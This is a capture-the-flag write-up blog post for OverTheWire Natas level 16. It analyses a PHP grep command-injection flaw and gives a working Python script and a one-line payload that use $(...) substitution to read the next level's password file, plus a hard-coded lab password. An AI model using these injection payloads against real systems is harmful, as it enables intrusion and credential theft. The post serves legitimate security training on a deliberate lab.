---
layout: post
title: Natas16 Writeup
categories:
- CTF writeups
- natas
tags:
- beginner
- command injection
- python
- script
description: Weird Grep Command Injection
date: 2024-10-27 12:40 -0400
---
### Source Code Analysis

```php
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

In this source code, we can see the `needle` parameter gets filtered
and placed directly into the grep command. So the first thing I could
think about is check for simple command injection, which I couldn't as
all of the operators are being filtered.

### Attack Vector

Doing some research reminds me the one of the most important function
for Linux, which is the command substitution `$(command)`. This allows
us to virtually run any command in the needle parameter, as this is pass
through as a `grep` command. With this the only thing missing is how can
we indicate the results of the command?

With the previous experience of natas15 and this being a `grep` command,
we can create a binary indicator. After a bit of trial and error, we know
that `doctors` is a single word in `dictionary.txt` (not a part of other words).
Then we can manipulate the needle parameter like this:

> `doctors$(grep a /etc/natas_webpass/natas17)`

For the substituted `grep` function, if the character exists in the password,
it will return the password, when combined with the word `doctors` it will not be found
in the dictionary. This means we can check if `doctors` exists in the response; If it
does, then the character does not exist in the password, vice versa.

### Some Regex Magic

Now for the last part, we have to know the order of the characters, it is impossible
to brute force the order of the password. For that we simply use the power of `regex`.

With `^` indicating the beginning of the word, we can check if the password starts with
some characters. For example, `^st` would match the word `start` and `star`, but not `ast`.
With this we can build a similar loop, finishing with a script to get the solution.

### Solution

```python
import requests
from requests.auth import HTTPBasicAuth
from halo import Halo

stage = 16
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

username = f"natas{stage}"
url = f"http://natas{stage}.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth(username, password)

passwd = ""
passwd_len = 32
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

with Halo(text="Enumerating", spinner="dots") as loading:
    loading.start()
    print("\n")
    for i in range(passwd_len):
        for char in charset:
            # Move cursor up two lines and clear them before printing the new update
            print("\033[F\033[K\033[F\033[K", end="")

            data = {
                "needle": f"doctors$(grep ^{passwd + char} /etc/natas_webpass/natas17)"
            }

            print(f"Password: {passwd}\nQuery: {data}")

            r = requests.post(url, auth=HTTPBasicAuth(username, password), data=data)
            if "doctors" not in r.text:
                passwd += char
                break

print(f"Final password: {passwd}")

```

### Bonus Solution

This extra solution I came across in the comments section of [John Hammond's Writeup](https://youtu.be/6XlDsn-R5oQ?si=-ZWvsVRav3Cn66WC)
which is super interesting, so I've decided to include here as well.

> It's also possible to solve this with a single request using a redirection trick:
> `$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)qqq`
>
> Explanation:
>
> `$$` - current bash PID
>
> `/proc/{process ID}/fd/1` - `stdout` of a specific process
>
> qqq - a search string likely to return empty results

Solution by [@geetub9073](https://www.youtube.com/@geetub9073)
